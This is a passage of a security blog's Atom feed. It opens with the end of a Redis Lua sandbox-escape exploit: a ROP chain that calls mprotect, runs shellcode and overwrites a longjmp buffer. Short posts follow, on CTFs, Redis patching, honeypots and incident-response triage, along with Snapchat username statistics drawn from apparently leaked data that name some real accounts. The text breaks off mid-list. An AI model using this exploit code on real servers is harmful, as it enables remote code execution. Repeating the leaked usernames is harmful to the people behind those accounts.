\"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\",\n          \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\",\n          \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\",\n\n          \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\",\n          \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\",\n          \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\",\n          \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\",\n\n           --[[ poprdipoprbp, ]] rdi, dummy,\n           rop_addresses.poprsipoprbp, rsi, dummy,\n           rop_addresses.poprbxpopr14poprbp, poprbp, rdx_all, dummy,\n           rop_addresses.movrdxr14callrbx,\n           mprotect_addr,\n\n           shellcode_ptr,\n\n           rop_addresses.poprdipoprbp, rdi, dummy,\n           rop_addresses.poprsipoprbp, rsi, dummy,\n           rop_addresses.poprbxpopr14poprbp, poprbp, rdx_read_write, dummy,\n           rop_addresses.movrdxr14callrbx,\n           mprotect_addr,\n\n           rop_addresses.poprdipoprbp, old_jump_buf_addr, dummy,\n           longjmp_addr,\n\n           \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\"\n         }\n\n  payload_str = table.concat(payload, \"\")\n\n  local payload_string_addr = addint(cstring(payload_str), 4096)\n\n  print(\"[*] new sp \" .. dump8(payload_string_addr))\n\n  --[[ TODO: we always seem to get back strings that are correctly 16 byte aligned. handle unaligned strings? ]]\n  if (string.byte(payload_string_addr, 1) % 16) ~= 8 then\n    fail(\"payload not aligned\")\n  end\n\n\n  write_word(jmp_buf_sp, payload_string_addr)\n  write_word(jmp_buf_eip, rop_addresses.poprdipoprbp)\n\n  --[[ you can also overwrite the SP at stackpointer - 16 .\n  but if we corrupt long jump then it is possible to return back into redis :) ]]\n\n  print(\"[*] executing payload\")\n  error(\"wat\")\nend)\n\ncoroutine.resume(co)\n\nprint(\"[*] resumed normal redis execution\")\n\ncollectgarbage()\n\nreturn 42\n" 0
</code></pre></div></div>

<p>Ben, thank you for the patch.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Redis"/>
    <category term="RCE"/>
    <category term="Exploit Development"/>
    <category term="Memory Corruption"/>
    <category term="Lua"/>
    <category term="Vulnerability Research"/>
    <category term="Patch Management"/>
    <category term="Offensive Security"/>
    <category term="CTF"/>
    <summary type="html"><![CDATA[Do you feel lucky]]></summary>
  </entry>
  <entry>
    <title type="html">Ingenious CTF dashboard</title>
    <link href="https://www.securesql.info/2015/07/11/polictf-2015-results/" rel="alternate" type="text/html" title="Ingenious CTF dashboard"/>
    <published>2015-07-11T00:00:00-07:00</published>
    <updated>2015-07-11T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2015/07/11/polictf-2015-results</id>
    <content type="html" xml:base="https://www.securesql.info/2015/07/11/polictf-2015-results/"><![CDATA[<p>As taken from a dummy account, I wish more CTFs were setup like this.
<a href="https://twitter.com/search?q=%23Polictf">#Polictf</a> 2015</p>

<p><img src="https://securesql.info/images/image-
asset.png.avif" alt="" /></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="CTF"/>
    <category term="dashboard"/>
    <category term="infosec"/>
    <category term="PoliCTF"/>
    <category term="capture the flag"/>
    <category term="user experience"/>
    <category term="security competitions"/>
    <category term="hacking"/>
    <category term="UI design"/>
    <category term="security training"/>
    <summary type="html"><![CDATA[As taken from a dummy account, I wish more CTFs were setup like this. [#Polictf](https://twitter.com/search?q=%23Polictf) 2015]]></summary>
  </entry>
  <entry>
    <title type="html">Destroy a City - secure code review</title>
    <link href="https://www.securesql.info/2015/07/02/how-to-destroy-a-city-code-review/" rel="alternate" type="text/html" title="Destroy a City - secure code review"/>
    <published>2015-07-02T00:00:00-07:00</published>
    <updated>2015-07-02T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2015/07/02/how-to-destroy-a-city-code-review</id>
    <content type="html" xml:base="https://www.securesql.info/2015/07/02/how-to-destroy-a-city-code-review/"><![CDATA[<p>#</p>

<p>“It should be noted that no ethically-trained software engineer would ever
consent to write a DestroyBaghdad procedure. Basic professional ethics would
instead require him to write a DestroyCity procedure, to which Baghdad could
be given as a parameter.”</p>

<p>— Nathaniel S Borenstein</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="secure coding"/>
    <category term="software ethics"/>
    <category term="code review"/>
    <category term="professional ethics"/>
    <category term="Nathaniel Borenstein"/>
    <category term="infosec"/>
    <category term="parameterization"/>
    <category term="satire"/>
    <category term="software engineering"/>
    <summary type="html"><![CDATA[It should be noted that no ethically-trained software engineer would ever consent to write a DestroyBaghdad procedure]]></summary>
  </entry>
  <entry>
    <title type="html">Redis RCE</title>
    <link href="https://www.securesql.info/2015/06/14/redis-rce/" rel="alternate" type="text/html" title="Redis RCE"/>
    <published>2015-06-14T00:00:00-07:00</published>
    <updated>2015-06-14T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2015/06/14/redis-rce</id>
    <content type="html" xml:base="https://www.securesql.info/2015/06/14/redis-rce/"><![CDATA[<p>If you haven’t already, time to patch Redis.  Otherwise, please setup
authentication in front of your Redis instance.</p>

<p>This remote code execution is going to get nasty
http://www.shodanhq.com/search?q=redis_version and
https://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/ .
Time to bring up a few honeypots to grab some decent exploits and related
kits.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Redis"/>
    <category term="RCE"/>
    <category term="remote code execution"/>
    <category term="authentication"/>
    <category term="vulnerability"/>
    <category term="honeypot"/>
    <category term="exploit kits"/>
    <category term="patching"/>
    <category term="infosec"/>
    <category term="Shodan"/>
    <summary type="html"><![CDATA[If you haven't already, time to patch Redis. Otherwise, please setup authentication in front of your Redis instance. This remote code execution is going to get nasty http]]></summary>
  </entry>
  <entry>
    <title type="html">Social Engineering Confirmation Bias workflow</title>
    <link href="https://www.securesql.info/2015/06/14/social-engineering-bias/" rel="alternate" type="text/html" title="Social Engineering Confirmation Bias workflow"/>
    <published>2015-06-14T00:00:00-07:00</published>
    <updated>2015-06-14T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2015/06/14/social-engineering-bias</id>
    <content type="html" xml:base="https://www.securesql.info/2015/06/14/social-engineering-bias/"><![CDATA[<p>The image below shows the role confirmatory bias can play in social
engineering exploits. Two situations are depicted. In the first, the insider
desires access to information supplied by the outsider’s created (deceptive)
scenario, as depicted in the R2 (orange) feedback loop. The second is where
the insider desires to be helpful to the malicious outsider in need as
depicted in the R3 (green) feedback loop. Both loops portray the reinforcing
of trust in the outsider’s authenticity and the subsequent desire to access
information or to be helpful.</p>

<p><img src="https://securesql.info/images/image-
asset.png.avif" alt="" /></p>

<blockquote>
  <p>“Unintentional Insider Threats: Social Engineering - US CERT
CMU/SEI-2013-TN-024”</p>
</blockquote>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="social engineering"/>
    <category term="confirmation bias"/>
    <category term="insider threat"/>
    <category term="US-CERT"/>
    <category term="SEI"/>
    <category term="human factors"/>
    <category term="infosec"/>
    <category term="trust exploitation"/>
    <category term="feedback loops"/>
    <category term="deception tactics"/>
    <summary type="html"><![CDATA[The image below shows the role confirmatory bias can play in social engineering exploits. Two situations are depicted. In the first, the insider desires access to information supplied by the]]></summary>
  </entry>
  <entry>
    <title type="html">ElasticSearch honeypot dataset</title>
    <link href="https://www.securesql.info/2015/06/10/elasticsearch-honeypot-tokens/" rel="alternate" type="text/html" title="ElasticSearch honeypot dataset"/>
    <published>2015-06-10T00:00:00-07:00</published>
    <updated>2015-06-10T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2015/06/10/elasticsearch-honeypot-tokens</id>
    <content type="html" xml:base="https://www.securesql.info/2015/06/10/elasticsearch-honeypot-tokens/"><![CDATA[<p>I have uploaded a new ElasticSearch honeypot dataset.  It appears there are a
few individuals who are attempting to exploit a few 0days in ElasticSearch.
All the more reason not to expose non-battle hardened open source projects to
the Internet.</p>

<p>https://github.com/lordappsec/datasets/blob/master/osint/ElasticHoney/elastichoney_logs.json</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="ElasticSearch"/>
    <category term="honeypot"/>
    <category term="dataset"/>
    <category term="0day"/>
    <category term="exploit attempts"/>
    <category term="open source security"/>
    <category term="cybersecurity"/>
    <category term="internet exposure"/>
    <category term="infosec"/>
    <category term="log analysis"/>
    <summary type="html"><![CDATA[I have uploaded a new ElasticSearch honeypot dataset. It appears there are a few individuals who are attempting to exploit a few 0days in ElasticSearch. All the more reason not]]></summary>
  </entry>
  <entry>
    <title type="html">Ghcq Challenge Completed</title>
    <link href="https://www.securesql.info/2015/05/18/ghcq-challenge-completed/" rel="alternate" type="text/html" title="Ghcq Challenge Completed"/>
    <published>2015-05-18T00:00:00-07:00</published>
    <updated>2015-05-18T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2015/05/18/ghcq-challenge-completed</id>
    <content type="html" xml:base="https://www.securesql.info/2015/05/18/ghcq-challenge-completed/"><![CDATA[<p>View fullsize</p>

<p><img src="https://securesql.info/images/Screen+Shot+2013-09-19+at+2.28.04+PM.png.avif" alt="" /></p>

<p>This was a fun, intellectually stimulating challenge.  Thank you #GCHQ .</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="GCHQ"/>
    <category term="cyber challenge"/>
    <category term="puzzle solving"/>
    <category term="infosec"/>
    <category term="cryptography"/>
    <category term="intellectual challenge"/>
    <category term="capture the flag"/>
    <category term="security challenge"/>
    <category term="cybersecurity"/>
    <category term="GCHQ competition"/>
    <summary type="html"><![CDATA[View fullsize]]></summary>
  </entry>
  <entry>
    <title type="html">Impressive Node.JS vulnerability reduction</title>
    <link href="https://www.securesql.info/2015/04/21/nodejs-security-posture-improvement/" rel="alternate" type="text/html" title="Impressive Node.JS vulnerability reduction"/>
    <published>2015-04-21T00:00:00-07:00</published>
    <updated>2015-04-21T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2015/04/21/nodejs-security-posture-improvement</id>
    <content type="html" xml:base="https://www.securesql.info/2015/04/21/nodejs-security-posture-improvement/"><![CDATA[<p>In 2013, when I last performed a secure code review on Node.JS, it did not
look pretty.</p>

<p><img src="https://securesql.info/images/image-
asset.png.avif" alt="" /></p>

<p>Now the vulnerability pie looks like the following;</p>

<p><img src="https://securesql.info/images/image-
asset.png.avif" alt="" /></p>

<p>Impressive change.  Over the coming months, we will dig into the fixes and
remediations involved to reduce the risk to the Node.JS community.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="NodeJS"/>
    <category term="vulnerability reduction"/>
    <category term="secure coding"/>
    <category term="code review"/>
    <category term="security improvements"/>
    <category term="open source security"/>
    <category term="risk mitigation"/>
    <category term="JavaScript security"/>
    <category term="community contributions"/>
    <category term="remediation efforts"/>
    <summary type="html"><![CDATA[In 2013, when I last performed a secure code review on Node.JS, it did not look pretty.]]></summary>
  </entry>
  <entry>
    <title type="html">Need help figuring out a Snapchat username? I have your back.</title>
    <link href="https://www.securesql.info/2015/04/15/popular-snapchat-names/" rel="alternate" type="text/html" title="Need help figuring out a Snapchat username? I have your back."/>
    <published>2015-04-15T00:00:00-07:00</published>
    <updated>2015-04-15T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2015/04/15/popular-snapchat-names</id>
    <content type="html" xml:base="https://www.securesql.info/2015/04/15/popular-snapchat-names/"><![CDATA[<p>Jessica asks “I just got a snap chat n I want a cool username my names Jessica
I tried to do so many user names wit my name but there all taken I want a rely
unique one but not weird so I need ideas!!!”  -
<a href="http://answers.yahoo.com/question/index?qid=20121225093158AAMOpu2">http://answers.yahoo.com/question/index?qid=20121225093158AAMOpu2</a> .</p>

<p>Well, Jessica, let me help you.  I can’t tell you what makes a good Snapchat
username.  But what I can tell you is what makes a popular Snapchat username.</p>

<p><em><strong>Top 10 base words in the username</strong></em></p>

<p>chris = 779 (0.02%)</p>

<p>alex = 744 (0.02%)</p>

<p>mike = 691 (0.01%)</p>

<p>ashley = 612 (0.01%)</p>

<p>nick = 585 (0.01%)</p>

<p>anthony = 547 (0.01%)</p>

<p>matt = 521 (0.01%)</p>

<p>jess = 504 (0.01%)</p>

<p>steph = 491 (0.01%)</p>

<p>amanda = 490 (0.01%)</p>

<p><em><strong>The length of a username</strong></em></p>

<p>3 = 1605 (0.03%)</p>

<p>4 = 15460 (0.34%)</p>

<p>5 = 80193 (1.74%)</p>

<p>6 = 230707 (5.0%)</p>

<p>7 = 419731 (9.11%)</p>

<p>8 = 594500 (12.9%)</p>

<p>9 = 644745 (13.99%)</p>

<p>10 = 635258 (13.78%)</p>

<p>11 = 563808 (12.23%)</p>

<p>12 = 484685 (10.51%)</p>

<p>13 = 385229 (8.36%)</p>

<p>14 = 297672 (6.46%)</p>

<p>15 = 256023 (5.55%)</p>

<p>18 = 1 (0.0%)</p>

<p>20 = 2 (0.0%)</p>

<p>26 = 1 (0.0%)</p>

<p>29 = 1 (0.0%)</p>

<p><em><strong>The most popular character sets to create a username</strong></em></p>

<p>allstring: 2076601 (45.05%)</p>

<p>stringdigit: 1619213 (35.13%)</p>

<p>stringspecialstring: 509677 (11.06%)</p>

<p>othermask: 191237 (4.15%)</p>

<p>stringspecialdigit: 120925 (2.62%)</p>

<p>stringdigitstring: 91968 (2.0%)</p>

<p><em><strong>If you wanted to end your username in digits, these are the ten most
popular 4 digits</strong></em></p>

<p>2013 = 5340 (0.12%)</p>

<p>1234 = 4750 (0.1%)</p>

<p>2000 = 3048 (0.07%)</p>

<p>2012 = 2432 (0.05%)</p>

<p>1991 = 2045 (0.04%)</p>

<p>1990 = 2019 (0.04%)</p>

<p>1994 = 2010 (0.04%)</p>

<p>2345 = 1988 (0.04%)</p>

<p>1992 = 1926 (0.04%)</p>

<p>1993 = 1916 (0.04%)</p>

<p><em><strong>On a more serious note</strong></em></p>

<p>It is worth mentioning not many usernames share different phone numbers.  Out
of 4.6 million phone numbers, only a few share the same username.  This is an
interesting.  Why?  I am not certain.  I wonder if these are internal test
accounts:</p>

<p>baten_tp = 2 (0.0%)</p>

<p>giggless14 = 2 (0.0%)</p>

<p>majestick666 = 2 (0.0%)</p>

<p>queenofthisshit = 2 (0.0%)</p>

<p>spoon4real = 2 (0.0%)</p>

<p>dorabuggz = 2 (0.0%)</p>

<p>gala.pardo = 1 (0.0%)</p>

<p>erinspickles = 1 (0.0%)</p>

<p>flyinghorses = 1 (0.0%)</p>

<p>saraelizabeth98 = 1 (0.0%)</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Snapchat"/>
    <category term="username tips"/>
    <category term="social media trends"/>
    <category term="username patterns"/>
    <category term="data analysis"/>
    <category term="popular names"/>
    <category term="digital identity"/>
    <category term="user behavior"/>
    <category term="Jessica username help"/>
    <category term="Snapchat analytics"/>
    <summary type="html"><![CDATA[I can’t tell you what makes a good Snapchat username. But what I can tell you is what makes a popular Snapchat username.]]></summary>
  </entry>
  <entry>
    <title type="html">Yet another nail in SSL TLS ‘s coffin</title>
    <link href="https://www.securesql.info/2015/04/14/rc4-openssl-deathsdoor/" rel="alternate" type="text/html" title="Yet another nail in SSL TLS ‘s coffin"/>
    <published>2015-04-14T00:00:00-07:00</published>
    <updated>2015-04-14T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2015/04/14/rc4-openssl-deathsdoor</id>
    <content type="html" xml:base="https://www.securesql.info/2015/04/14/rc4-openssl-deathsdoor/"><![CDATA[<p>Via <a href="https://community.qualys.com/blogs/securitylabs/2013/03/19/rc4-in-
tls-is-broken-now-what">Ivan</a> - “…RC4 has long been considered problematic, but
until very recently there was no known way to exploit the weaknesses. After
the BEAST attack was disclosed in 2011, we—grudgingly—started using RC4 in
order to avoid the vulnerable CBC suites in TLS 1.0 and earlier. This caused
the usage of RC4 to increase, and some say that it now accounts for about 50%
of all TLS traffic.</p>

<p>Last week, a group of researchers (Nadhem AlFardan, Dan Bernstein, Kenny
Paterson, Bertram Poettering and Jacob Schuldt) <a href="http://www.isg.rhul.ac.uk/tls/">announced significant
advancements in the attacks against RC4</a>,
unveiling new weaknesses as well as new methods to exploit them. Matthew Green
has a <a href="http://blog.cryptographyengineering.com/2013/03/attack-
of-week-rc4-is-kind-of-broken-in.html">great overview</a> on his blog, and here are the
<a href="http://cr.yp.to/talks/2013.03.12/slides.pdf">slides</a> from the talk where the
new issues were announced.</p>

<p>At the moment, the attack is not yet practical because it requires access to
millions and possibly billions of copies of the same data encrypted using
different keys. A browser would have to make that many connections to a server
to give the attacker enough data. A possible exploitation path is to somehow
instrument the browser to make a large number of connections, while a man in
the middle is observing and recording the traffic.</p>

<p>We are still safe at the moment, but there is a tremendous incentive for
researchers to improve the attacks on RC4, which means that we need to act
swiftly….”</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="SSL"/>
    <category term="TLS"/>
    <category term="RC4 vulnerability"/>
    <category term="cryptographic attacks"/>
    <category term="BEAST attack"/>
    <category term="cipher suite weaknesses"/>
    <category term="man-in-the-middle"/>
    <category term="encryption insecurity"/>
    <category term="deprecated protocols"/>
    <category term="security research"/>
    <summary type="html"><![CDATA[RC4 has long been considered problematic, but until very recently there was no known way to exploit the weaknesses]]></summary>
  </entry>
  <entry>
    <title type="html">Technical Approaches to Determining if an Incident Occurred</title>
    <link href="https://www.securesql.info/2015/04/02/infosec-ir-triaging-workflows/" rel="alternate" type="text/html" title="Technical Approaches to Determining if an Incident Occurred"/>
    <published>2015-04-02T00:00:00-07:00</published>
    <updated>2015-04-02T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2015/04/02/infosec-ir-triaging-workflows</id>
    <content type="html" xml:base="https://www.securesql.info/2015/04/02/infosec-ir-triaging-workflows/"><![CDATA[<h1 id="key-takeaways">Key Takeaways</h1>

<p>When addressing potential incidents and applying best practice incident
response procedures:</p>

<ul>
  <li>
    <p>First, collect and remove for further analysis:</p>

    <ul>
      <li>
        <p>Relevant artifacts,</p>
      </li>
      <li>
        <p>Logs, and</p>
      </li>
      <li>
        <p>Data.</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Next, implement mitigation steps that avoid tipping off the adversary that their presence in the network has been discovered.</p>
  </li>
  <li>
    <p>Finally, consider soliciting incident response support from a third-party IT security organization to:</p>

    <ul>
      <li>
        <p>Provide subject matter expertise and technical support to the incident response,</p>
      </li>
      <li>
        <p>Ensure that the actor is eradicated from the network, and</p>
      </li>
      <li>
        <p>Avoid residual issues that could result in follow-up compromises once the incident is closed.</p>
      </li>
    </ul>
  </li>
</ul>

<h3 id="technical-details">Technical Details</h3>

<p>The incident response process requires a variety of technical approaches to
uncover malicious activity. Incident responders should consider the following
activities.</p>

<ul>
  <li>
    <p><strong>Indicators of Compromise (IOC) Search</strong> – Collect known-bad indicators of compromise from a broad variety of sources, and search for those indicators in network and host artifacts. Assess results for further indications of malicious activity to eliminate false positives.</p>
  </li>
  <li>
    <p><strong>Frequency Analysis</strong> – Leverage large datasets to calculate normal traffic patterns in both network and host systems. Use these predictive algorithms to identify activity that is inconsistent with normal patterns. Variables often considered include timing, source location, destination location, port utilization, protocol adherence, file location, integrity via hash, file size, naming convention, and other attributes.</p>
  </li>
  <li>
    <p><strong>Pattern Analysis</strong> – Analyze data to identify repeating patterns that are indicative of either automated mechanisms (e.g., malware, scripts) or routine human threat actor activity. Filter out the data containing normal activity and evaluate the remaining data to identify suspicious or malicious activity.</p>
  </li>
  <li>
    <p><strong>Anomaly Detection</strong> – Conduct an analyst review (based on the team’s knowledge of, and experience with, system administration) of collected artifacts to identify errors. Review unique values for various datasets and research associated data, where appropriate, to find anomalous activity that could be indicative of threat actor activity.</p>
  </li>
</ul>

<h3 id="recommended-artifact-and-information-collection">Recommended Artifact and Information Collection</h3>

<p>When hunting and/or investigating a network, it is important to review a broad
variety of artifacts to identify any suspicious activity that may be related
to the incident. Consider collecting and reviewing the following artifacts
throughout the investigation.</p>

<h1 id="host-based-artifacts"><strong>Host-Based Artifacts</strong></h1>

<ul>
  <li>
    <p>Running Processes</p>
  </li>
  <li>
    <p>Running Services</p>
  </li>
  <li>
    <p>Parent-Child Process Trees</p>
  </li>
  <li>
    <p>Integrity Hash of Background Executables</p>
  </li>
  <li>
    <p>Installed Applications</p>
  </li>
  <li>
    <p>Local and Domain Users</p>
  </li>
  <li>
    <p>Unusual Authentications</p>
  </li>
  <li>
    <p>Non-Standard Formatted Usernames</p>
  </li>
  <li>
    <p>Listening Ports and Associated Services</p>
  </li>
  <li>
    <p>Domain Name System (DNS) Resolution Settings and Static Routes</p>
  </li>
  <li>
    <p>Established and Recent Network Connections</p>
  </li>
  <li>
    <p>Run Key and other AutoRun Persistence</p>
  </li>
  <li>
    <p>Scheduled Tasks</p>
  </li>
  <li>
    <p>Artifacts of Execution (Prefetch and Shimcache)</p>
  </li>
  <li>
    <p>Event logs</p>
  </li>
  <li>
    <p>Anti-virus detections</p>
  </li>
</ul>

<h1 id="information-to-review-for-host-analysis"><strong>Information to Review for Host Analysis</strong></h1>

<ul>
  <li>
    <p>Identify any process that is not signed and is connecting to the internet looking for beaconing or significant data transfers.</p>
  </li>
  <li>
    <p>Collect all PowerShell command line requests looking for Base64-encoded commands to help identify malicious fileless attacks.</p>
  </li>
  <li>
    <p>Look for excessive <code class="language-plaintext highlighter-rouge">.RAR</code>, <code class="language-plaintext highlighter-rouge">7zip</code>, or <code class="language-plaintext highlighter-rouge">WinZip</code> processes, especially with suspicious file names, to help discover exfiltration staging (suspicious file names include naming conventions such as, <code class="language-plaintext highlighter-rouge">1.zip</code>, <code class="language-plaintext highlighter-rouge">2.zip</code>, etc.).</p>
  </li>
  <li>
    <p>Collect all user logins and look for outlier behavior, such as a time of login that is out of the ordinary for the user or a login from an Internet Protocol (IP) address not normally used by the user.</p>
  </li>
  <li>
